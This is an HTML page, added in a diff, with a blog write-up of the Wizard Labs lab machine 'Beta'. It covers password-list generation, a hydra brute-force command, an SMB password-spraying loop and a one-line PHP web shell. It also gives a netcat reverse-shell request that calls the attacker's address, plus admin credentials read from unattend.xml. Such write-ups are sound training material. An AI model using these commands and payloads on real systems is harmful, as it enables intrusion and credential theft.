@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Wizard Labs &#8211; Beta</title>
+	<meta name="description" content="  ">
+	
+	<link rel="canonical" href="http://0.0.0.0:4000/2019/04/17/wizard-labs-beta/">
+	<link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://0.0.0.0:4000/feed.xml" />
+	
+	<!-- <link rel="stylesheet" href="/css/main.css"> -->
+    
+    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/index.css">
+	<script type="text/javascript" src="/static/js/jquery-1.11.1.min.js"></script>
+	<script type="text/javascript" src="/static/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="/static/css/monokai_sublime.min.css">
+	<script type="text/javascript" src="/static/js/highlight.min.js"></script>
+
+    <!--
+    <link rel="stylesheet" type="text/css" href="http://apps.bdimg.com/libs/bootstrap/3.3.0/css/bootstrap.min.css">
+	<script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"></script>
+	<script type="text/javascript" src="http://apps.bdimg.com/libs/bootstrap/3.3.0/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="http://apps.bdimg.com/libs/highlight.js/8.4/styles/monokai_sublime.min.css">
+	<script type="text/javascript" src="http://apps.bdimg.com/libs/highlight.js/8.4/highlight.min.js"></script>
+    -->
+    
+	<script type="text/javascript" src="/static/js/index.js"></script>
+	<script>hljs.initHighlightingOnLoad();</script>
+</head>
+
+ <!--  <body data-spy="scroll" data-target="#myAffix"> -->
+  <body>
+
+    <header>
+
+<!-- navbar -->
+  <nav class="navbar navbar-inverse">
+  <div class="container">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">Your awesome title</a>
+      <p class="navbar-text"></p>
+    </div>
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav navbar-right">
+
+        
+          <li>
+        
+        <a href="/">Home</a></li>
+
+        
+          
+        
+          
+            
+              <li>
+            
+            <a href="/about/"><span class="glyphicon "></span> About</a></li>
+          
+        
+          
+            
+              <li>
+            
+            <a href="/about/"><span class="glyphicon "></span> About</a></li>
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+
+</header>
+
+    <div id="main" class="container main">
+      <div class="row">
+  <div id="myArticle" class="col-sm-9">
+    <div class="post-area post">
+      <header>
+        <h1>Wizard Labs &#8211; Beta</h1>
+        <p>Apr 17, 2019 • rowbot</p>
+      </header>
+      <hr>
+      <article>
+        <div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-27.png?w=680" alt="" class="wp-image-755" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-27.png?w=178 178w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-27.png?resize=156%2C300 156w" sizes="(max-width: 178px) 100vw, 178px" data-recalc-dims="1" /></figure>
+</div>
+
+<p>This box lead me down a rabbit hole…damn you H4d3s. I spent a lot of time bruteforcing web panel passwords. I had bother scanning the box, nmap hung a lot of the time but eventually I got a full scan done.</p>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?w=680" alt="" class="wp-image-756" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?w=969 969w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?resize=300%2C235 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-28.png?resize=768%2C602 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
+</div>
+
+<p>I tried to connect to the telnet service but got kicked out</p>
+
+<p>Port 80 gave a website with no directories.</p>
+
+<pre class="wp-block-preformatted">No more connections are allowed to telnet server. Please try again later.Connection closed by foreign host.
+</pre>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-29.png?w=680" alt="" class="wp-image-757" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-29.png?w=691 691w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-29.png?resize=300%2C153 300w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
+</div>
+
+<p>Port 3000 gave another website that revealed some user information and passwords.<figure class="wp-block-image"></figure></p>
+
+<p><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?w=680" alt="" class="wp-image-737" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?w=788 788w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?resize=300%2C98 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-22.png?resize=768%2C251 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> &lt;/figure&gt;</p>
+
+<p>python code is as follows which revealed a user russel and passwords.</p>
+
+<pre class="wp-block-preformatted"><br />"""<br /> Just a secure password generator made by Russel T !! Used to generate passwords  mostly for file sharing protocols <br /> Contact:russel@beta.corp<br /> """<br /> import random<br /> import sys<br /> menu = """<br /> <em>_                      _</em> <br /> / <em>\   / </em> __ _ <strong>_ </strong><em>   / </em> ___  /\ \ \<br /> \ \ / _ \/ <strong>|/ /<em>)/ </em>` / </strong>/ <strong>| / /<em>\/ </em> \/  \/ / <em>\ \  </em></strong><em>/ (<strong>/ <em>/ (</em>| __ __ \/ /<em>\  / /\  / <br /> _</em>/___|___\/    __,<em>|</em></strong>/<strong><em>/_</em></strong>/__</em>_\ \/  <br />                                 Beta Corp<br /> """<br /> words = ['lollip0p','rain','summer','little','honey']<br /> end  = [1,2,3,4,5]<br /> print(menu)<br /> word = random.choice(words)<br /> num = random.choice(end)<br /> password = (word)+(str(num))<br /> print("the secure password is : {}".format(password)) </pre>
+
+<p>In order to generate all the random passwords I created this script</p>
+
+<pre class="wp-block-preformatted"><font color="#C4A000">for</font> i in {1..100}; <font color="#C4A000">do</font> <font color="#4E9A06">python</font> <u style="text-decoration-style:single">passgen.py</u> | <font color="#4E9A06">grep</font> <font color="#C4A000">"the secure password is"</font> &gt;&gt; <u style="text-decoration-style:single">out.pass</u> | <font color="#4E9A06">cut</font> -d<font color="#C4A000">" "</font> -f6 &gt;&gt; <u style="text-decoration-style:single">list.txt</u> ;<font color="#C4A000">done</font> </pre>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-23.png?w=680" alt="" class="wp-image-739" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-23.png?w=155 155w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-23.png?resize=105%2C300 105w" sizes="(max-width: 155px) 100vw, 155px" data-recalc-dims="1" /></figure>
+</div>
+
+<p>picking the user russel@beta.corp and also russel and the list.txt I used hydra to try to bruteforce the login at the /user login panel and the /admin login panel</p>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-30.png?w=680" alt="" class="wp-image-784" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-30.png?w=686 686w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-30.png?resize=300%2C145 300w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
+</div>
+
+<pre><font color="#4E9A06">hydra</font> -l russel@beta.corp -P <u style="text-decoration-style:single">list.txt</u> 10.1.1.15 http-post-form <font color="#C4A000">"/user/login:username=^USER^&amp;password=^PASS^@Login=Login:Username"</font> -V -s 3000
+</pre>
+
+<pre class="wp-block-preformatted">[ATTEMPT] target 10.1.1.15 - login "russel" - pass "summer3" - 446 of 450 [child 5] (0/0)
+[ATTEMPT] target 10.1.1.15 - login "russel" - pass "honey2" - 447 of 450 [child 1] (0/0)
+[ATTEMPT] target 10.1.1.15 - login "russel" - pass "honey2" - 448 of 450 [child 6] (0/0)
+[ATTEMPT] target 10.1.1.15 - login "russel" - pass "summer2" - 449 of 450 [child 2] (0/0)
+[ATTEMPT] target 10.1.1.15 - login "russel" - pass "lollip0p4" - 450 of 450 [child 7] (0/0)
+1 of 1 target completed, 0 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-17 12:18:14
+<span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#CC0000">✘ </font></span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> 
+</pre>
+
+<p>I realised there was a better way to generate the passwords</p>
+
+<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#CC0000">✘ </font></span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> <font color="#4E9A06">cat</font> <u style="text-decoration-style:single">pass1</u>                
+lollip0p
+rain
+summer
+little
+honey
+<span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#CC0000">✘ </font></span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> <font color="#C4A000">for</font> i in <font color="#75507B">$(</font><font color="#4E9A06">cat</font> <u style="text-decoration-style:single">pass1</u><font color="#75507B">)</font>; <font color="#C4A000">do</font> <font color="#4E9A06">echo</font> $i{1..5} &gt;&gt; <u style="text-decoration-style:single">output</u>;<font color="#C4A000">done</font>
+<span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> <font color="#4E9A06">cat</font> <u style="text-decoration-style:single">output</u> 
+lollip0p1 lollip0p2 lollip0p3 lollip0p4 lollip0p5
+rain1 rain2 rain3 rain4 rain5
+summer1 summer2 summer3 summer4 summer5
+little1 little2 little3 little4 little5
+honey1 honey2 honey3 honey4 honey5
+<span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> 
+</pre>
+
+<p>I took a step back and looked at the nmap scan results and seem there were SMB ports open. enum4linux and smbmap revealed nothing but nmap came back and revealed 3 shares that require passwords to access.</p>
+
+<pre><font color="#4E9A06">nmap</font> $ip -p 445,139 <font color="#C4A000">"--script=smb-enum*"
+Host script results:
+| smb-enum-shares: 
+|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
+|   account_used: &lt;blank&gt;
+|   \\10.1.1.15\ADMIN$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: &lt;none&gt;
+|   \\10.1.1.15\C$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: &lt;none&gt;
+|   \\10.1.1.15\IPC$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|_    Anonymous access: READ
+</font>
+</pre>
+
+<p>I used the following script to try all passwords combos</p>
+
+<pre class="wp-block-preformatted"><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#CC0000">✘ </font></span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> <font color="#C4A000">for</font> i in <font color="#75507B">$(</font><font color="#4E9A06">cat</font> <u style="text-decoration-style:single">output</u><font color="#75507B">)</font>; <font color="#C4A000">do</font> <font color="#4E9A06">echo</font> $i &amp;&amp;  <font color="#4E9A06">smbclient</font> //$ip/admin$ -U russel $i; <font color="#C4A000">done</font>
+...
+session setup failed: NT_STATUS_LOGON_FAILURE
+little5
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sun Sep 23 14:34:50 2018
+  ..                                  D        0  Sun Sep 23 14:34:50 2018
+  addins                              D        0  Tue Jul 14 05:52:31 2009
+  AppCompat                           D        0  Tue Jul 14 03:37:05 2009
+  AppPatch                            D        0  Tue Apr 12 03:16:01 2011
+  assembly                          DSR        0  Sat Sep 22 20:55:40 2018
+</pre>
+
+<p>username = russel<br />
+password = little5</p>
+
+<p>Using the put command in smb I added a shell exec file called webby.php and put it into c:\xampp\htdocs so I could access it.</p>
+
+<p>webby.php contains<br />
+<?php echo shell\_exec($\_GET[&#8216;cmd&#8217;]); ?></p>
+
+<p>I get command execution</p>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-24.png?w=680" alt="" class="wp-image-751" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-24.png?w=610 610w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-24.png?resize=300%2C83 300w" sizes="(max-width: 610px) 100vw, 610px" data-recalc-dims="1" /></figure>
+</div>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-25.png?w=680" alt="" class="wp-image-752" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-25.png?w=718 718w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-25.png?resize=300%2C142 300w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
+</div>
+
+<p>To get a nc shell I ran the following with a listener – nc -lnvp 443 :</p>
+
+<p>http://10.1.1.15/webby.php?cmd=nc.exe 10.253.0.255 443 -e cmd.exe</p>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-26.png?w=680" alt="" class="wp-image-753" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-26.png?w=616 616w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-26.png?resize=300%2C62 300w" sizes="(max-width: 616px) 100vw, 616px" data-recalc-dims="1" /></figure>
+</div>
+
+<p>Running through my <a href="https://guide.offsecnewbie.com/privilege-escalation/windows-pe">Win Priv</a> checks reveals the admin password</p>
+
+<pre>C:\xampp\htdocs&gt;type c:\unattend.xml
+type c:\unattend.xml
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;unattend xmlns="urn:schemas-microsoft-com:unattend"&gt;
+    &lt;settings pass="windowsPE"&gt;
+        &lt;component name="Microsoft-Windows-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64"&gt;
+            &lt;WindowsDeploymentServices&gt;
+                &lt;Login&gt;
+                    &lt;WillShowUI&gt;OnError&lt;/WillShowUI&gt;
+                    &lt;Credentials&gt;
+                        &lt;Username&gt;Administrator&lt;/Username&gt;
+                        &lt;Domain&gt;beta&lt;/Domain&gt;
+                        &lt;mark&gt;&lt;Password&gt;loveLyp4ssw0rd*!&lt;/Password&gt;&lt;/mark&gt;
+                    &lt;/Credentials&gt;
+</pre>
+
+<p>Using smbclient logging in as Administrator I was able to capture the root flag</p>
+
+<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/beta </font></span><font color="#3465A4"></font> <font color="#4E9A06">smbclient</font> //$ip/C$ -U administrator
+Enter WORKGROUP\administrator';s password: 
+</pre>
+
+<pre>smb: \Users\Administrator\Desktop\&gt; mget root.txt 
+Get file root.txt? y
+getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+</pre>
+
+<p>Fun box which felt quite OSCP like, especially when it had me down a rabbit hole of the Gogs web application.</p>
+
+<div class="wp-block-image">
+  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-31.png?w=680" alt="" class="wp-image-798" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-31.png?w=349 349w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-31.png?resize=300%2C52 300w" sizes="(max-width: 349px) 100vw, 349px" data-recalc-dims="1" /><figcaption>f1f95d42573c2f3940bfae6fdba05e5a</figcaption></figure>
+</div>
+
+<p>I tried to use the “runas” command to start a nc reverse shell as administrator but couldn’t get it working. If you did, let me know how you did it.</p>
+
+      </article>
+      <hr>
+        <div class="bdsharebuttonbox">
+            <a href="#" class="bds_more" data-cmd="more"></a>
+            <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+            <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+            <a href="#" class="bds_fbook" data-cmd="fbook" title="Share to Facebook"></a>
+            <a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+        </div>
+        <script>
+            window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    </div>
+	    
+  </div>
+  
+  <div id="content" class="col-sm-3">
+    <!-- <div id="myAffix" class="shadow-bottom-center hidden-xs" data-spy="affix" data-offset-top="0" data-offset-bottom="-20"> -->
+    <div id="myAffix" class="shadow-bottom-center hidden-xs" >
+      <div class="categories-list-header">
+        Content
+      </div>
+      <div class="content-text"></div>
+    </div>
+  </div>
+  
+</div>
+    </div>
+
+    
+    <div id="top" data-toggle="tooltip" data-placement="left" title="back to top">
+      <a href="javascript:;">
+        <div class="arrow"></div>
+        <div class="stick"></div>
+      </a>
+    </div>
+
+    <footer class="">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <a href="mailto:your-email@example.com"><span class="glyphicon glyphicon-envelope"></span> your-email@example.com</a>
+        <span class="point"> · </span>
+        
+          <a href="https://github.com/jekyll">
+            <span class="icon">
+              <svg viewBox="0 0 16 16">
+                <path fill="#aaa" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/>
+              </svg>
+            </span>
+            Github
+            <!-- <span>jekyll</span> -->
+          </a>
+          
+          <span class="point"> · </span>
+          <span><a href="_posts/2019-04-17-wizard-labs-beta.md">View source</a></span>
+          <span class="point"> · </span>
+          <span><a class="newpost" href="javascript:;">New post</a></span>
+		  <span class="point"> · </span>
+          <span><a href="/feed.xml">RSS</a></span>
+          <span class="point"> · </span>
+          <span>&copy; 2015 LiXizhi</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+    <script type="text/javascript">
+    function OnClickNewPost()
+    {
+        var title = prompt("Please enter title of your post");
+        if (title!=null){
+            title = title.replace(" ", "-");
+            var currentdate = new Date();
+            var urlNewPage = "?filename=_posts/" 
+                + currentdate.getFullYear() + "-" + (currentdate.getMonth()+1) + "-" + currentdate.getDate() + "-" + title + ".md";
+                
+            var defaultText =  [
+                '---',
+                'layout: post',
+                'comments: true',
+                'categories: diary',
+                '---',
+                '## Title',
+                'text'
+                ].join('\n');
+            urlNewPage += "&value=" + encodeURIComponent(defaultText);
+            window.open(urlNewPage);
+        }
+    }
+    
+    $(function() {
+      // CreateNewPostLinks
+      $('.newpost').each(function(){
+          $(this).click(OnClickNewPost);
+      });
+    });
+</script>
+  
+  </body>
+</html>
